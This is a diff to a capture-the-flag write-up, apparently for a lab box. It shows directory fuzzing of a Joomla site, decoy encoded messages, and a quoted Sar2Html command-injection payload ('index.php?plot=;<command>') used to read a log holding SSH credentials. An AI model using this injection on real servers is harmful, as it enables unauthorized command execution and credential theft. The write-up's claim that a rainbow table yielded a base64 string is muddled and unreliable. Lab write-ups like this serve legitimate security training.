@@ -111,31 +111,101 @@ is a content management system (CMS) that allows you to build websites. So we
 keep enumerating using joomla joomla/FUZZ and shortly we find a lot of stuff.
 
 ```
-media                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 46ms]
-templates               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 49ms]
-images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 2820ms]
-modules                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 48ms]
-tests                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 57ms]
-bin                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 48ms]
-plugins                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 57ms]
-includes                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 48ms]
-language                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 48ms]
-README.txt              [Status: 200, Size: 4793, Words: 479, Lines: 72, Duration: 51ms]
-components              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 49ms]
+images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 54ms]
+index.php               [Status: 200, Size: 12478, Words: 772, Lines: 259, Duration: 331ms]
+media                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 50ms]
+templates               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 50ms]
+modules                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 50ms]
+tests                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 50ms]
+bin                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 49ms]
+plugins                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 51ms]
+includes                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 49ms]
+language                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 70ms]
+README.txt              [Status: 200, Size: 4793, Words: 479, Lines: 72, Duration: 52ms]
+components              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 50ms]
 cache                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 48ms]
-index.php               [Status: 200, Size: 12478, Words: 772, Lines: 259, Duration: 118ms]
-libraries               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 52ms]
-installation            [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 48ms]
-build                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 49ms]
-LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 49ms]
-tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 54ms]
-layouts                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 47ms]
+libraries               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 48ms]
+robots.txt              [Status: 200, Size: 829, Words: 82, Lines: 32, Duration: 52ms]
+build                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 51ms]
+LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 58ms]
+tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 50ms]
+layouts                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 49ms]
+administrator           [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 48ms]
+configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
+htaccess.txt            [Status: 200, Size: 3159, Words: 449, Lines: 86, Duration: 51ms]
+cli                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 63ms]
+_files                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 52ms]
+.html                   [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 49ms]
+.php                    [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 53ms]
 ```
 
-I start by exploring the index.php page to get aquanted with the site. There is 
-a pretty standard joomla site with a login page but there doesn't seem to be
+I start by exploring the index.php page to get aquanted with the site. There is
+a pretty standard looking site with a login page but there doesn't seem to be
 any default passwords for Joomla sites.
 
-Checking the Readme.txt file we find that we seem to be running Joomla v3.9.
-Checking CVE information shows that old version of Joomla have been plagued with
-vulnerabilities, which we might be able to exploit.
+After that I just keep going through each folder and file. Most of them are empty
+or just standard files and scripts.
+
+But then we check \_files and find a code
+
+```
+VjJodmNITnBaU0JrWVdsemVRbz0K
+```
+
+I check rainbow tables and we get a hit!
+
+```
+VjJodmNITnBaU0JrWVdsemVRbz0K:V2hvcHNpZSBkYWlzeQo=
+```
+
+Which seems to be a base64 encoded message. Decoding it we get:
+
+```
+Whopsie daisy
+
+```
+
+Not again lol...
+
+Out of ideas on how to proceed I decide to run another directory scan with Fuff
+with a bigger wordlist but found nothing new. Thinking I was missing something
+or this joomla pages was just a red herring I gave it one last attempt fuzzing
+using and underscore like the \_files folder had and found:
+
+```
+archive                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 55ms]
+files                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 51ms]
+test                    [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 49ms]
+database                [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 72ms]
+```
+
+Starting with archive we found the message:
+
+```
+Mnope, nothin to see.
+```
+
+Not much but maybe we are onto something here since both \_files and \_archive
+had custom messages.
+
+Checking \_test I found something called Sar2Html. Googling it to find out what
+it is and the first hit is an remote code execution exploit for version 3.2.1.
+
+```
+https://www.exploit-db.com/exploits/47204
+
+In web application you will see index.php?plot url extension.
+
+http://<ipaddr>/index.php?plot=;<command-here> will execute
+the command you entered. After command injection press "select # host" then your command's
+output will appear bottom side of the scroll screen.
+```
+
+Not sure if the version running is vulnerable but I try it just in case and
+it works like a charm. We run ls and see a file called log.txt. We cat it
+and find the following message:
+
+```
+Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1
+port 49824 ssh2 #pass: superduperp@$$
+```
